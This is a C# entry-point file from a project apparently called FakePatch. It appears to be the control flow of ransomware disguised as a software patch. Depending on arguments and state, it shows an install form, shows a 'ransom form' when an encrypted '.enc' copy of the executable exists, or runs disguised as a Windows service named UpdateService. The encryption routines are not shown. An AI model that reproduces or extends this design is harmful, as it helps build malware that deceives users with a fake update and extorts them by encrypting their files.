using System;
using System.IO;
using System.ServiceProcess;
using System.Windows.Forms;
using static FakePatch.Globals;
using static FakePatch.LogHelper;

namespace FakePatch
{
    internal static class Program
    {
        /// <summary>
        /// Punto di ingresso principale dell'applicazione.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            if (Environment.UserInteractive)
            {
                Log("[Main] Interactive mode detected: running as application");
                Log("[Main] Executable Path: " + Application.ExecutablePath);
                Log("[Main] Is elevated? " + gIsElevated);
                FileInfo ExecutablePath = new FileInfo(Application.ExecutablePath);
                FileInfo EncryptedExecutablePath = new FileInfo(Path.Combine(ExecutablePath.Directory.FullName, Path.ChangeExtension(ExecutablePath.Name, Path.GetExtension(ExecutablePath.Name) + ".enc")));

                //Arguments check
                if (args.Length > 0 && args[0] == "-install")
                {
                    Application.Run(new InstallForm(args[0]));
                }
                else
                {
                    if (File.Exists(EncryptedExecutablePath.FullName))
                    {
                        //Ransom form
                        Log("[Main] Found encrypted application in the same path: " + EncryptedExecutablePath.Name, LogLevel.Debug);
                        Log("[Main] Going to run ransom form", LogLevel.Debug);
                        Application.Run(new UnlockForm());
                    }
                    else
                    {
                        Log("[Main] No encrypted files found. Going to run install form", LogLevel.Debug);
                        Application.Run(new InstallForm());
                    }
                }
            }
            else
            {
                Log("[Main] Not-interactive mode detected: running as service");
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new UpdateService()
                };
                ServiceBase.Run(ServicesToRun);
            }
        }
    }
}
